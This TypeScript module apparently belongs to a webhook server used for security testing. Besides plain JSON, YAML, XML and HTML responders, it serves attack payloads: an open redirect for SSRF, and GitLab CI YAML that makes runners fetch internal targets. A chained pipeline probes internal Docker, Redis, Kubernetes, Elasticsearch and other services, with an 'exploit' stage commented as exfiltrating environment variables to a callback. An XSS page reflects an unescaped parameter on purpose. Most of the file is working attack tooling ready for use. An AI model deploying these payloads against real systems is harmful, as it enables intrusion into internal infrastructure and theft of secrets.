import { baseLog, logEntry } from "../lib/log";

/**
 * Payload generation helpers for various content types.
 */

function getParam(request: Request, name: string): string | null {
  return new URL(request.url).searchParams.get(name);
}

function jsonResponse(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data, null, 2), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

// ── Generic payload endpoints ──────────────────────────────────

export function jsonPayload(request: Request): Response {
  const cb = getParam(request, "callback");
  const log = baseLog(request);
  logEntry({ ...log, event: "payload:json", callback: cb || undefined });

  const body: Record<string, unknown> = {
    status: "ok",
    timestamp: new Date().toISOString(),
    message: "This is a JSON webhook response",
    data: { id: 1, name: "test" },
  };

  if (cb) {
    return new Response(`${cb}(${JSON.stringify(body)})`, {
      headers: { "Content-Type": "application/javascript" },
    });
  }
  return jsonResponse(body);
}

export function yamlPayload(request: Request): Response {
  const log = baseLog(request);
  logEntry({ ...log, event: "payload:yaml" });

  const body = [
    "---",
    "status: ok",
    "timestamp: " + new Date().toISOString(),
    "message: This is a YAML webhook response",
    "data:",
    "  id: 1",
    "  name: test",
    "",
  ].join("\n");

  return new Response(body, {
    headers: { "Content-Type": "application/x-yaml" },
  });
}

export function xmlPayload(request: Request): Response {
  const log = baseLog(request);
  logEntry({ ...log, event: "payload:xml" });

  const body = [
    '<?xml version="1.0" encoding="UTF-8"?>',
    "<response>",
    "  <status>ok</status>",
    `  <timestamp>${new Date().toISOString()}</timestamp>`,
    "  <message>This is an XML webhook response</message>",
    "  <data>",
    "    <id>1</id>",
    "    <name>test</name>",
    "  </data>",
    "</response>",
  ].join("\n");

  return new Response(body, {
    headers: { "Content-Type": "application/xml" },
  });
}

export function htmlPayload(request: Request): Response {
  const log = baseLog(request);
  const title = getParam(request, "title") || "Webhook";
  logEntry({ ...log, event: "payload:html", title });

  const body = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>${escapeHtml(title)}</title>
  <style>
    body { font-family: system-ui; max-width: 640px; margin: 2rem auto; padding: 0 1rem; }
    pre { background: #f4f4f4; padding: 1rem; border-radius: 4px; overflow-x: auto; }
  </style>
</head>
<body>
  <h1>${escapeHtml(title)}</h1>
  <p>This is an HTML webhook response.</p>
  <pre>GET ${escapeHtml(request.url)}</pre>
  <p><small>Generated at ${new Date().toISOString()}</small></p>
</body>
</html>`;

  return new Response(body, {
    headers: { "Content-Type": "text/html; charset=utf-8" },
  });
}

export function jsPayload(request: Request): Response {
  const cb = getParam(request, "callback");
  const log = baseLog(request);
  logEntry({ ...log, event: "payload:js", callback: cb || undefined });

  const body = `// JavaScript webhook response
(function() {
  console.log("Webhook JS payload loaded at ${new Date().toISOString()}");
  ${cb ? `\n  // Callback requested: ${cb}\n  if (typeof ${cb} === "function") {\n    ${cb}({ status: "ok", timestamp: "${new Date().toISOString()}" });\n  }` : ""}
})();`;

  return new Response(body, {
    headers: { "Content-Type": "application/javascript" },
  });
}

// ── SSRF helpers ────────────────────────────────────────────────

export function ssrfRedirect(request: Request): Response {
  const url = new URL(request.url);
  const target = url.searchParams.get("url");
  const log = baseLog(request);
  logEntry({ ...log, event: "ssrf:redirect", target: target || undefined });

  if (!target) {
    return new Response(
      JSON.stringify({
        error: "Missing ?url= parameter",
        usage: `${url.origin}/ssrf?url=http://internal-service:8080/path`,
      }),
      { status: 400, headers: { "Content-Type": "application/json" } }
    );
  }

  return Response.redirect(target, 302);
}

/**
 * YAML payload for GitLab `include:remote:` SSRF trigger.
 * When included via `include: remote: "https://hooks.example.com/ssrf-include-remote.yml"`,
 * GitLab will execute the jobs defined here, triggering requests back to internal services.
 */
export function ssrfIncludeYaml(request: Request, baseUrl: string): Response {
  const log = baseLog(request);
  logEntry({ ...log, event: "payload:ssrf-include-remote" });

  // Resolve a scan target URL from query or default to cycle
  const redirectTarget = getParam(request, "target") || `${baseUrl}/gitlab/scan.yml`;

  const body = [
    "---",
    `# SSRF include-remote payload — included by GitLab CI`,
    `# Pass ?target=http://internal:8080 to redirect to a specific target`,
    "",
    "stages:",
    "  - probe",
    "",
    "ssrf-probe:",
    "  stage: probe",
    "  image: alpine:latest",
    "  script:",
    `    - wget -O- '${redirectTarget}' || curl -L '${redirectTarget}' || true`,
    "  tags: []",
    "",
  ].join("\n");

  return new Response(body, {
    headers: { "Content-Type": "application/x-yaml" },
  });
}

/**
 * Chained SSRF — multi-job pipeline that probes high-value targets in parallel.
 * Each job hits a different internal service category for maximum coverage.
 */
export function ssrfChainedYaml(request: Request, baseUrl: string): Response {
  const log = baseLog(request);
  logEntry({ ...log, event: "payload:ssrf-chained" });

  const body = [
    "---",
    "# Chained SSRF — probes multiple internal service categories in parallel",
    "",
    "stages:",
    "  - recon",
    "  - exploit",
    "",
    "########################## RECON STAGE ##########################",
    "",
    "# Docker API (tcp 2375/2376) — pivot to container escape",
    "probe-docker:",
    "  stage: recon",
    "  image: alpine:latest",
    "  script:",
    "    - wget -q -O- --timeout=5 http://198.18.0.1:2375/containers/json || true",
    "    - wget -q -O- --timeout=5 http://198.18.0.1:2376/containers/json || true",
    "  allow_failure: true",
    "",
    "# Redis (tcp 6379) — potential RCE via master/slave",
    "probe-redis:",
    "  stage: recon",
    "  image: alpine:latest",
    "  script:",
    `    - echo -e "PING\\r\\n" | nc -w 3 198.18.0.1 6379 || true`,
    "  allow_failure: true",
    "",
    "# Postgres (tcp 5432) — read files via COPY",
    "probe-postgres:",
    "  stage: recon",
    "  image: alpine:latest",
    "  script:",
    "    - wget -q -O- --timeout=5 http://198.18.0.1:5432/ || true",
    "  allow_failure: true",
    "",
    "# Kubernetes API (tcp 6443/8443/10250) — cluster admin",
    "probe-k8s:",
    "  stage: recon",
    "  image: alpine:latest",
    "  script:",
    "    - wget -q -O- --no-check-certificate --timeout=5 https://198.18.0.1:6443/api || true",
    "    - wget -q -O- --no-check-certificate --timeout=5 https://198.18.0.1:8443/api || true",
    "    - wget -q -O- --no-check-certificate --timeout=5 https://198.18.0.1:10250/pods || true",
    "  allow_failure: true",
    "",
    "# Gitaly (tcp 8075) / GitLab internal — repo access",
    "probe-gitlab-internal:",
    "  stage: recon",
    "  image: alpine:latest",
    "  script:",
    "    - wget -q -O- --timeout=5 http://198.18.0.1:8075/ || true",
    "    - wget -q -O- --timeout=5 http://198.18.0.1:8080/ || true",
    "    - wget -q -O- --timeout=5 http://198.18.0.1:3000/ || true",
    "  allow_failure: true",
    "",
    "# Adjacent IPs (tcp 8080 on neighbor nodes)",
    "probe-adjacent:",
    "  stage: recon",
    "  image: alpine:latest",
    "  script:",
    "    - wget -q -O- --timeout=5 http://198.18.0.2:8080/ || true",
    "    - wget -q -O- --timeout=5 http://198.18.0.3:8080/ || true",
    "    - wget -q -O- --timeout=5 http://198.19.0.1:8080/ || true",
    "  allow_failure: true",
    "",
    "# Elasticsearch (tcp 9200) — cluster info disclosure",
    "probe-es:",
    "  stage: recon",
    "  image: alpine:latest",
    "  script:",
    "    - wget -q -O- --timeout=5 http://198.18.0.1:9200/_cluster/health || true",
    "    - wget -q -O- --timeout=5 http://198.18.0.1:9200/_nodes || true",
    "  allow_failure: true",
    "",
    "# Prometheus (tcp 9090) — metrics / targets disclosure",
    "probe-prometheus:",
    "  stage: recon",
    "  image: alpine:latest",
    "  script:",
    "    - wget -q -O- --timeout=5 http://198.18.0.1:9090/api/v1/targets || true",
    "    - wget -q -O- --timeout=5 http://198.18.0.1:9090/metrics || true",
    "  allow_failure: true",
    "",
    "########################## EXPLOIT STAGE ##########################",
    "# Runs after recon — chain on discovered services",
    "",
    "# If Docker is open, exfil env vars to your callback",
    "exploit-docker:",
    "  stage: exploit",
    "  image: alpine:latest",
    "  script:",
    `    - wget -q -O- '${baseUrl}/json?callback=docker_hit' || true`,
    "  allow_failure: true",
    "",
  ].join("\n");

  return new Response(body, {
    headers: { "Content-Type": "application/x-yaml" },
  });
}

// ── XSS helpers ─────────────────────────────────────────────────

export function xssPayload(request: Request): Response {
  const param = getParam(request, "payload");
  const log = baseLog(request);
  logEntry({ ...log, event: "payload:xss", payload: param || undefined });

  const payload = param || "<script>alert(1)</script>";

  const body = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XSS Test</title>
</head>
<body>
  <h1>XSS Payload</h1>
  <p>Reflected payload (view source for raw):</p>
  <div id="output">${payload}</div>
</body>
</html>`;

  return new Response(body, {
    headers: { "Content-Type": "text/html; charset=utf-8" },
  });
}

// ── Utils ───────────────────────────────────────────────────────

function escapeHtml(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}
